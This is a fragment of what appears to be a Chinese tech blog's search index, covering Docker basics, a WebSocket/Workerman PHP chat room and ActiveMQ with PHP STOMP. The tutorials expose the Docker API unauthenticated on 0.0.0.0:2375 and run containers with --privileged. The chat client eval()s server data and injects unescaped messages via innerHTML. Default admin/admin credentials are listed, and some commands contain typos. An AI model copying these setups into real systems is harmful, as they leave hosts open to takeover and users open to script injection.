tmp:/etc/nginx/nginx.conf /home/git/docker_build_conf/</span><br></pre></td></tr></table></figure><h2 id="启动nginx容器，加载宿主机的配置文件启动"><a href="#启动nginx容器，加载宿主机的配置文件启动" class="headerlink" title="启动nginx容器，加载宿主机的配置文件启动"></a>启动nginx容器，加载宿主机的配置文件启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mynginx --privileged -p 9090:80 -v /home/git/docker_build_conf/nginx.conf:/etc/nginx/nginx.conf -d centos:nginx</span><br></pre></td></tr></table></figure><p>以上，我们就手工完成了一个nginx容器的搭建！</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker容器的基本操作</title>
      <link href="/2017/12/18/docker%E5%AE%B9%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2017/12/18/docker%E5%AE%B9%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p> 拉取官方镜像、创建、终端操作容器、执行命令<br><a id="more"></a></p><h3 id="拉取centos官方纯净镜像"><a href="#拉取centos官方纯净镜像" class="headerlink" title="拉取centos官方纯净镜像"></a>拉取centos官方纯净镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    docker pull centos</span><br><span class="line">```  </span><br><span class="line"><span class="comment">### 操作容器</span></span><br><span class="line">- 查看容器列表</span><br></pre></td></tr></table></figure><pre><code>docker images</code></pre><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>查看正在运行的容器列表</span><br></pre></td></tr></table></figure><pre><code>dcoker ps</code></pre><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby"> 启动容器</span></span><br><span class="line"><span class="ruby">    </span></span><br><span class="line"><span class="ruby">        docker run</span></span><br><span class="line"><span class="ruby">         -<span class="symbol">i:</span>打开stdin,用于和容器进行交互，通常与-t同时使用；</span></span><br><span class="line"><span class="ruby">         -t：为容器创建虚拟终端</span></span><br><span class="line"><span class="ruby">         --name 为容器指定一个名称</span></span><br><span class="line"><span class="ruby">         --privileged 赋予外部操作内部容器的权限</span></span><br><span class="line"><span class="ruby"><span class="string">``</span><span class="string">`   </span></span></span><br><span class="line"><span class="ruby">        docker run -it --name mycentos centos</span></span><br></pre></td></tr></table></figure><ul><li><p>退出容器</p><pre><code>ctrl+d</code></pre></li><li><p>重新登录到退出的容器</p><pre><code>docker attach 容器id/容器别名</code></pre></li><li><p>在容器中执行命令</p><pre><code>docker exec 容器名 执行的命令</code></pre></li><li><p>查看容器日志</p><pre><code>docker log 容器名字</code></pre></li></ul><h2 id="dockerfile设置容器基本功能"><a href="#dockerfile设置容器基本功能" class="headerlink" title="dockerfile设置容器基本功能"></a>dockerfile设置容器基本功能</h2><p>举个例子:</p><p>Dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">From</span> centos:latest</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install httpd</span></span><br><span class="line"><span class="bash">RUN systemctl <span class="built_in">enable</span> httpd.service</span></span><br><span class="line"><span class="bash">EXPOSE 80</span></span><br><span class="line"><span class="bash">CMD /usr/sbin/init</span></span><br></pre></td></tr></table></figure><p>在同个目录下创建新的镜像</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">build </span>-t centos:httpd .</span><br></pre></td></tr></table></figure><h2 id="容器和主机间的数据共享"><a href="#容器和主机间的数据共享" class="headerlink" title="容器和主机间的数据共享"></a>容器和主机间的数据共享</h2><pre><code>-v 宿主机:容器目录</code></pre><h2 id="配置远程连接-访问"><a href="#配置远程连接-访问" class="headerlink" title="配置远程连接/访问"></a>配置远程连接/访问</h2><p>宿主机为linux环境<br>编辑 usr/lib/systemd/system/docker.service<br>把原本是<br>ExecStart=/usr/bin/dockerd<br>改成<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=<span class="regexp">/usr/bin</span><span class="regexp">/dockerd -H tcp:/</span><span class="regexp">/0.0.0.0:2375 -H unix:/</span><span class="regexp">/var/run</span><span class="regexp">/docker.sock</span></span><br><span class="line"><span class="regexp">保存重启docker</span></span><br></pre></td></tr></table></figure></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systemctl daemon-reload</span></span><br><span class="line"><span class="attribute">systemctl restart docker</span></span><br></pre></td></tr></table></figure><h2 id="docker管理工具portainer"><a href="#docker管理工具portainer" class="headerlink" title="docker管理工具portainer"></a>docker管理工具portainer</h2><p> <a href="http://portainer.readthedocs.io/en/stable/deployment.html#" target="_blank" rel="noopener">官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker的安装，下载阿里云镜像，运行外部php容器</title>
      <link href="/2017/12/12/docker%E7%9A%84%E5%AE%89%E8%A3%85%EF%BC%8C%E4%B8%8B%E8%BD%BD%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F%EF%BC%8C%E8%BF%90%E8%A1%8C%E5%A4%96%E9%83%A8php%E5%AE%B9%E5%99%A8/"/>
      <url>/2017/12/12/docker%E7%9A%84%E5%AE%89%E8%A3%85%EF%BC%8C%E4%B8%8B%E8%BD%BD%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F%EF%BC%8C%E8%BF%90%E8%A1%8C%E5%A4%96%E9%83%A8php%E5%AE%B9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>docker现在越来越火，了解或者熟悉掌握是很有必要的。那么就开始我们的折腾之旅吧。<br><a id="more"></a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>因为本机是安装了centos机器，所以安装实在centos环境下安装的，选择安装的是dockerce<br>具体见:<a href="https://docs.docker.com/engine/installation/linux/docker-ce/centos/" target="_blank" rel="noopener">官方文档</a><br>亦可以参考<a href="https://yq.aliyun.com/articles/110806" target="_blank" rel="noopener">阿里云dockerce官方文档</a></p><h2 id="配置国内镜像加速器"><a href="#配置国内镜像加速器" class="headerlink" title="配置国内镜像加速器"></a>配置国内镜像加速器</h2><p>镜像源选择阿里云镜像源，在国内的，速度很快。<a href="https://dev.aliyun.com/search.html" target="_blank" rel="noopener">地址</a><br>配置使用镜像加速器 <a href="https://cr.console.aliyun.com/?spm=5176.1971733.0.2.QGmb9O#/accelerator" target="_blank" rel="noopener">地址</a></p><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>拉取镜像:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry<span class="selector-class">.cn-hangzhou</span><span class="selector-class">.aliyuncs</span><span class="selector-class">.com</span>/lxepoo/apache-php5</span><br></pre></td></tr></table></figure><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"DOCKER_OPTS=\"</span>\$DOCKER_OPTS --registry-mirror=https://sa4qxjsg.mirror.aliyuncs.com<span class="string">""</span> | sudo tee -a /etc/<span class="keyword">default</span>/docker</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>websocket+workerman实现聊天室</title>
      <link href="/2017/12/11/websocket-workerman%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4/"/>
      <url>/2017/12/11/websocket-workerman%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4/</url>
      
        <content type="html"><![CDATA[<p>websocket+workerman实现聊天室<br><a id="more"></a></p><h1 id="简易聊天室"><a href="#简易聊天室" class="headerlink" title="简易聊天室"></a>简易聊天室</h1><p>在之前的文章当中websocket和php socket我们都学习了，基本原理也已经摸清楚了，接下来，我们可以使用php的一个socket框架写一个简单的聊天室。<br>功能主要有：</p><ul><li>使用昵称登陆到聊天室中</li><li>同步聊天室的在线用户列表</li><li>点对点发送消息</li></ul><h2 id="效果图如下所示"><a href="#效果图如下所示" class="headerlink" title="效果图如下所示:"></a>效果图如下所示:</h2><p><img src="task.gif" alt=""></p><h2 id="客户端代码如下所示"><a href="#客户端代码如下所示" class="headerlink" title="客户端代码如下所示:"></a>客户端代码如下所示:</h2><pre><code class="bash">&lt;!DOCTYPE html&gt;&lt;html lang=<span class="string">"en"</span>&gt;&lt;head&gt;    &lt;!-- 最新版本的 Bootstrap 核心 CSS 文件 --&gt;    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>          integrity=<span class="string">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span> crossorigin=<span class="string">"anonymous"</span>&gt;    &lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;    &lt;script src=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>            integrity=<span class="string">"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"</span>            crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=<span class="string">"container"</span>&gt;    &lt;div class=<span class="string">"header clearfix"</span>&gt;        &lt;h3 class=<span class="string">"text-muted"</span>&gt;我的月亮你的心&lt;/h3&gt;    &lt;/div&gt;    &lt;div class=<span class="string">"jumbotron"</span>&gt;        &lt;div id=<span class="string">"txtcontent"</span> style=<span class="string">"width:auto;height:250px;border: solid 1px white"</span>&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;div class=<span class="string">"row marketing"</span>&gt;        &lt;div class=<span class="string">"col-lg-8"</span>&gt;            &lt;div&gt;                &lt;div class=<span class="string">"form-group"</span>&gt;                    &lt;label&gt;所有用户:&lt;/label&gt;                    &lt;select id=<span class="string">"listusers"</span>&gt;&lt;/select&gt;                &lt;/div&gt;                &lt;div class=<span class="string">"form-group"</span>&gt;                    &lt;label&gt;你的昵称:&lt;/label&gt;                    &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> id=<span class="string">"username"</span>/&gt;                &lt;/div&gt;                &lt;div class=<span class="string">"form-group"</span>&gt;                    &lt;label <span class="keyword">for</span>=<span class="string">"exampleInputFile"</span>&gt;消息内容:&lt;/label&gt;                    &lt;textarea style=<span class="string">"width:500px;height:100px"</span> id=<span class="string">"txtmsg"</span>&gt;&lt;/textarea&gt;                &lt;/div&gt;                &lt;button onclick=<span class="string">"connectServer()"</span> class=<span class="string">"btn btn-default"</span>&gt;连接服务器&lt;/button&gt;                &lt;button onclick=<span class="string">"send()"</span> class=<span class="string">"btn btn-default"</span>&gt;发送消息&lt;/button&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt; &lt;!-- /container --&gt;&lt;script&gt;    // 创建一个Socket实例    var socket = null;//初始是null    var isLogin = <span class="literal">false</span>;//是否登录到服务器上    <span class="keyword">function</span> <span class="function"><span class="title">send</span></span>() {        <span class="keyword">if</span> (!isLogin) {            alert(<span class="string">"请先服务器验证"</span>);            <span class="built_in">return</span>;        }        var msg = document.getElementById(<span class="string">"txtmsg"</span>).value;        var listusers = document.getElementById(<span class="string">"listusers"</span>);        var toUserIP = listusers.options[listusers.selectedIndex].value;//发给用户的IP和端口 ，        var toUserName = listusers.options[listusers.selectedIndex].text;//发给用户的 昵称        socket.send(<span class="string">"chat:&lt;"</span> + toUserIP + <span class="string">"&gt;:"</span> + msg);        //chat:&lt;192.168.1.10:56002&gt;:xxxxoo&gt;        //在div 中显示我们的行为        var p = document.createElement(<span class="string">"P"</span>);        p.innerHTML = <span class="string">"&lt;span&gt;发送消息给["</span> + toUserName + <span class="string">"]&lt;/span&gt;"</span> + msg;        document.getElementById(<span class="string">"txtcontent"</span>).appendChild(p)    }    <span class="keyword">function</span> <span class="function"><span class="title">connectServer</span></span>() {        var userName = document.getElementById(<span class="string">"username"</span>).value;        <span class="keyword">if</span> (userName == <span class="string">""</span>) {            alert(<span class="string">"用户昵称必填 "</span>);            <span class="built_in">return</span>;        }        socket = new WebSocket(<span class="string">'ws://192.168.164.134:9091/'</span>);        // 打开Socket        socket.onopen = <span class="keyword">function</span> (event) {            socket.send(<span class="string">"login:"</span> + userName);        };        socket.onmessage = <span class="keyword">function</span> (event) {            var getMsg = event.data;            <span class="keyword">if</span> (/^notice:success$/.<span class="built_in">test</span>(getMsg)) //服务器验证通过,后面做任何发送操作            {                isLogin = <span class="literal">true</span>;            }            <span class="keyword">else</span> <span class="keyword">if</span> (/^msg:/.<span class="built_in">test</span>(getMsg)) //代表是普通消息            {                //&lt;p&gt;xxxxooo&lt;/p&gt;                var p = document.createElement(<span class="string">"P"</span>);                p.innerHTML = <span class="string">"&lt;span&gt;收到消息&lt;/span&gt;"</span> + getMsg.replace(<span class="string">"msg:"</span>, <span class="string">""</span>);                document.getElementById(<span class="string">"txtcontent"</span>).appendChild(p);            } <span class="keyword">else</span> <span class="keyword">if</span> (/^users:/.<span class="built_in">test</span>(getMsg)) { //显示当前已登录用户                getMsg = getMsg.replace(<span class="string">'users:'</span>, <span class="string">''</span>);                getMsg = <span class="built_in">eval</span>(<span class="string">'('</span> + getMsg + <span class="string">')'</span>); //转json                console.log(getMsg);                var listusers = document.getElementById(<span class="string">'listusers'</span>);                listusers.innerHTML = <span class="string">''</span>;//清空                <span class="keyword">for</span> (var key <span class="keyword">in</span> getMsg) {                    console.log(key);                    var option = document.createElement(<span class="string">'option'</span>);                    option.value = key; //ip                    option.innerHTML = getMsg[key]; //昵称                    listusers.appendChild(option); //添加元素进去                }            }            <span class="keyword">else</span> {            }        };        // 监听Socket的关闭        socket.onclose = <span class="keyword">function</span> (event) {            isLogin = <span class="literal">false</span>;        };    }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="服务端代码如下所示："><a href="#服务端代码如下所示：" class="headerlink" title="服务端代码如下所示："></a>服务端代码如下所示：</h2><p>（这是写在依赖wokerman写的服务端文件）</p><pre><code class="bash">&lt;?phprequire  __DIR__ . <span class="string">'/Workerman/Autoloader.php'</span>;use Workerman\Worker;use Workerman\Connection\AsyncTcpConnection;<span class="variable">$tcp_worker</span> = new Worker(<span class="string">"websocket://192.168.164.134:9091"</span>);<span class="variable">$tcp_worker</span>-&gt;count = 1;<span class="variable">$clients</span>=[];//保存客户端信息<span class="keyword">function</span> syncUsers(){    global <span class="variable">$clients</span>;    <span class="variable">$users</span> = <span class="string">'users:'</span>.json_encode(array_column(<span class="variable">$clients</span>,<span class="string">'name'</span>,<span class="string">'ipp'</span>));    foreach (<span class="variable">$clients</span> as <span class="variable">$ip</span>=&gt;<span class="variable">$client</span>){        <span class="variable">$client</span>[<span class="string">'conn'</span>]-&gt;send(<span class="variable">$users</span>);    }}<span class="variable">$tcp_worker</span>-&gt;onMessage = <span class="keyword">function</span>(<span class="variable">$connection</span>, <span class="variable">$data</span>){    global <span class="variable">$clients</span>;    <span class="variable">$ip</span> = <span class="variable">$connection</span>-&gt;getRemoteIp();    <span class="variable">$port</span> = <span class="variable">$connection</span>-&gt;getRemotePort();    <span class="keyword">if</span>(preg_match(<span class="string">"/^login:(\w{3,20})/i"</span>,<span class="variable">$data</span>,<span class="variable">$result</span>))//代表是客户端认证    {        <span class="keyword">if</span>(!array_key_exists(<span class="variable">$ip</span>.<span class="string">":"</span>.<span class="variable">$port</span>,<span class="variable">$clients</span>)) //必须是之前没有记录过        {            <span class="variable">$clients</span>[<span class="variable">$ip</span>.<span class="string">":"</span>.<span class="variable">$port</span>]=[<span class="string">'ipp'</span>=&gt;<span class="variable">$ip</span>.<span class="string">":"</span>.<span class="variable">$port</span>,<span class="string">'name'</span>=&gt;<span class="variable">$result</span>[1],<span class="string">'conn'</span>=&gt;<span class="variable">$connection</span>];            <span class="variable">$connection</span>-&gt;send(<span class="string">"notice:success"</span>);//            <span class="variable">$connection</span>-&gt;send(<span class="string">"msg:welcome back "</span>.<span class="variable">$result</span>[1]);            <span class="built_in">echo</span> <span class="variable">$connection</span>-&gt;getRemoteIp().<span class="string">":"</span>.<span class="variable">$result</span>[1].<span class="string">" login"</span>.PHP_EOL;            //一旦有用户登录就把保存的客户端信息发送过去            syncUsers();        }    }    <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/^msg:(.*?)/isU"</span>,<span class="variable">$data</span>,<span class="variable">$msgset</span>)) //代表 是客户端发送普通消息    {        <span class="keyword">if</span>(array_key_exists(<span class="variable">$connection</span>-&gt;getRemoteIp(),<span class="variable">$clients</span>)) //必须已经认证过得客户端        {            <span class="built_in">echo</span> <span class="string">"get msg :"</span>.<span class="variable">$msgset</span>[1];        }    }<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/^chat:\&lt;(.*?)\&gt;:(.*?)/isU"</span>,<span class="variable">$data</span>,<span class="variable">$msgset</span>))    {        <span class="variable">$ipp</span>=<span class="variable">$msgset</span>[1];        <span class="built_in">echo</span> <span class="variable">$ipp</span>;        <span class="variable">$msg</span>=<span class="variable">$msgset</span>[2];        <span class="keyword">if</span>(array_key_exists(<span class="variable">$ipp</span>,<span class="variable">$clients</span>))        {            <span class="variable">$clients</span>[<span class="variable">$ipp</span>][<span class="string">"conn"</span>]-&gt;send(<span class="string">"msg:"</span>.<span class="variable">$msg</span>);        }    }    <span class="variable">$connection</span>-&gt;onClose=<span class="keyword">function</span> (<span class="variable">$connection</span>)//客户端主动关闭    {        global <span class="variable">$clients</span>;        <span class="built_in">unset</span>(<span class="variable">$clients</span>[<span class="variable">$connection</span>-&gt;getRemoteIp().<span class="string">":"</span>.<span class="variable">$connection</span>-&gt;getRemotePort()]);        syncUsers();    };};<span class="variable">$tcp_worker</span>-&gt;onClose=<span class="keyword">function</span> (<span class="variable">$connection</span>) use(<span class="variable">$clients</span>){};// 运行workerWorker::runAll();</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ActiveMq安装以及使用php第三方stomp来操作ActiveMQ</title>
      <link href="/2017/12/11/ActiveMq%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8php%E7%AC%AC%E4%B8%89%E6%96%B9stomp%E6%9D%A5%E6%93%8D%E4%BD%9CActiveMQ/"/>
      <url>/2017/12/11/ActiveMq%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8php%E7%AC%AC%E4%B8%89%E6%96%B9stomp%E6%9D%A5%E6%93%8D%E4%BD%9CActiveMQ/</url>
      
        <content type="html"><![CDATA[<p> 消息队列<br>在互联网项目开发者经常会遇到『给用户群发短信』、『订单系统有大量的日志需要记录』或者在秒杀业务的时候服务器无法承受瞬间并发的压力。<br>这种情况下，我们怎么保证系统正常有效的运行呢？</p><p>这个时候，我们可以引入一个叫『消息队列』的概念来解决上面的需求。<br><a id="more"></a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在高并发的时候，程序往往无法做到及时的处理。我们引入一个中间的系统，来进行分流和减压。<br>所以从本质上讲：消息队列就是一个队列结构的中间件。也就是说，你把消息和内容放入这个容器之后就可以直接返回，不用等它后期处理的结果。另外会有一个程序，读取这些数据并按照顺序处理。</p><ul><li>队列结构的中间件</li><li>消息放入后，不必立即处理</li><li>由订阅者/消费者按顺序处理</li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>当遇到一个比较大或者耗时比较长的环节的时候，而同时你的业务又不需要立即知道这个环节的结果，使用消息队列是好的选择。</p><ul><li><p>一、数据需要冗余的时候<br>比如订单系统中，后续需要进行数据的转换和记录。消息队列可以把这些数据持久化的存储在队列中，然后由订单后期处理程序进行处理，处理完成之后再把这条记录从队列中删除。</p></li><li><p>二、系统的解耦<br>消息队列解决了2套系统之间深度耦合的问题。<br>使用消息队列后，入队的系统和出队的系统没有直接的关系。<br>入队系统和出队系统，其中一个崩溃之后不会影响另外一个的正常运行。</p></li><li><p>三、流量削峰<br>就是秒杀和抢购的时候，会出现明显的流量剧增，对服务器的压力非常大。<br>实际项目开发中，配合缓存来使用消息队列，一种很好的方案。</p></li><li><p>四、异步通信<br>消息队列本身就实现了程序的异步操作，因此只要适合于异步的场景都可以使用消息队列</p></li><li><p>五、扩展性<br>比如订单系统，订单入队之后，后期或许还有财务系统处理，但是如果还要加一个配货系统。<br>只需要让这个配货系统 订阅这个 消息队列 即可。</p></li><li><p>六、排序保证<br>在有些场景下，数据的处理顺序是非常重要的，队列本身就可以做成单线程的单进单出的系统。<br>从而有效的保证数据按照顺序进行处理。</p></li></ul><h2 id="常见实现队列介质的优缺点"><a href="#常见实现队列介质的优缺点" class="headerlink" title="常见实现队列介质的优缺点"></a>常见实现队列介质的优缺点</h2><ul><li>Mysql：可靠性高、易实现、速度慢</li><li>Redis：速度快，单条大消息包时效率低</li><li>消息系统：专业性强、可靠，学习成本高(比如：RabbtiMQ)</li></ul><h2 id="消息处理的触发机制："><a href="#消息处理的触发机制：" class="headerlink" title="消息处理的触发机制："></a>消息处理的触发机制：</h2><p>死循环方式读取：易实现，故障时无法及时恢复；<br>定时任务：压力均分，有处理量上限。(最大的缺陷：定位任务时间的间隔和处理的数据需要精准把握，不能上一个任务还没有处理完成，下一个认为就已经启动了)<br>守护进程：类似于PHP-FPM和PHP-CGI，需要shell知识</p><p>那么，对于消息队列，我们现在就来学习ActiveMQ的使用。</p><h1 id="ActiveMQ环境部署"><a href="#ActiveMQ环境部署" class="headerlink" title="ActiveMQ环境部署"></a>ActiveMQ环境部署</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载地址：<a href="http://activemq.apache.org/activemq-5143-release.html" target="_blank" rel="noopener">http://activemq.apache.org/activemq-5143-release.html</a><br>下载apache-activemq-5.14.3-bin.tar.gz</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>解压apache-activemq-5.14.3-bin.tar.gz<br>tar -zxvf apache-activemq-5.14.3-bin.tar.gz</li><li>进入<br>cd apache-activemq-5.14.3/bin</li><li><p>启动activemq<br>./activemq start</p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>ActiveMQ自带了一个web服务器(jetty，是java开发的)，如果不了解没有关系，我们先学会怎么使用即可</p></li><li><p>访问这个web服务器: </p></li></ul><p><a href="http://127.0.01:8161/" target="_blank" rel="noopener">http://127.0.01:8161/</a> </p><ul><li>后台<br><a href="http://127.0.01:8161/admin" target="_blank" rel="noopener">http://127.0.01:8161/admin</a><br>用户名：admin<br>密码：admin </li></ul><h1 id="PHP中使用ActiveMQ实现消息队列"><a href="#PHP中使用ActiveMQ实现消息队列" class="headerlink" title="PHP中使用ActiveMQ实现消息队列"></a>PHP中使用ActiveMQ实现消息队列</h1><p>用PHP来操作ActiveMQ，我们可以借助一个第三方扩展。<br>下载:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;composer require fusesource/stomp-php:2.0.*</span><br></pre></td></tr></table></figure><h2 id="发送消息给队列"><a href="#发送消息给队列" class="headerlink" title="发送消息给队列"></a>发送消息给队列</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>; <span class="comment">//引入自动加载的文件</span></span><br><span class="line"></span><br><span class="line">$connect = <span class="keyword">new</span> \FuseSource\Stomp\Stomp(<span class="string">'tcp://192.168.164.134:61613'</span>);</span><br><span class="line">$connect-&gt;connect();</span><br><span class="line"></span><br><span class="line">$userId = <span class="number">1001</span>;</span><br><span class="line">$result = $connect-&gt;send(<span class="string">'email'</span>,$userId); <span class="comment">//比如发邮件</span></span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>发送成功，我们可以在后台看到消息队列名字<br><img src="activeMq.png" alt=""></p><p>上面的代码到这里，还不够完美。如果我们服务器重启了activemq，没有处理的消息会丢失。<br>这个时候我们需要用到send()方法的第三个参数。</p><p>//消息持久化 persistent为true，字符串的’true’<br>$result = $connect-&gt;send(‘email’,json_encode($data),array(‘persistent’=&gt;’true’));</p><h2 id="订阅（监听队列消息），并将完成的消息队列出列"><a href="#订阅（监听队列消息），并将完成的消息队列出列" class="headerlink" title="订阅（监听队列消息），并将完成的消息队列出列"></a>订阅（监听队列消息），并将完成的消息队列出列</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>; <span class="comment">//引入自动加载的文件</span></span><br><span class="line"></span><br><span class="line">$connect = <span class="keyword">new</span> \FuseSource\Stomp\Stomp(<span class="string">'tcp://192.168.164.134:61613'</span>);</span><br><span class="line">$connect-&gt;connect();</span><br><span class="line"></span><br><span class="line"><span class="comment">//$userId = 1001;</span></span><br><span class="line"><span class="comment">//$result = $connect-&gt;send('email',$userId); //比如发邮件</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line">$connect-&gt;subscribe(<span class="string">'email'</span>);</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">//会等待，直到有可用消息，才执行后面代码</span></span><br><span class="line">    <span class="keyword">if</span> ($connect-&gt;hasFrameToRead())&#123;</span><br><span class="line">        $frame = $connect-&gt;readFrame();</span><br><span class="line">        print_r($frame);</span><br><span class="line">        <span class="comment">//做业务逻辑</span></span><br><span class="line">        <span class="comment">//具体发送邮件的业务</span></span><br><span class="line">        <span class="comment">//send email</span></span><br><span class="line">        sleep(<span class="number">2</span>); <span class="comment">//模拟延时</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后通知mq，我们已经处理了该条消息</span></span><br><span class="line">        $connect-&gt;ack($frame);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//控制循环</span></span><br><span class="line">    $next = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/stop'</span>))&#123;</span><br><span class="line">        <span class="comment">//如果有名为stop的一个文件</span></span><br><span class="line">        <span class="comment">//就不循环了</span></span><br><span class="line">        $next = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> ($next);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>wokerman作为mysql代理</title>
      <link href="/2017/12/08/wokerman%E4%BD%9C%E4%B8%BAmysql%E4%BB%A3%E7%90%86/"/>
      <url>/2017/12/08/wokerman%E4%BD%9C%E4%B8%BAmysql%E4%BB%A3%E7%90%86/</url>
      
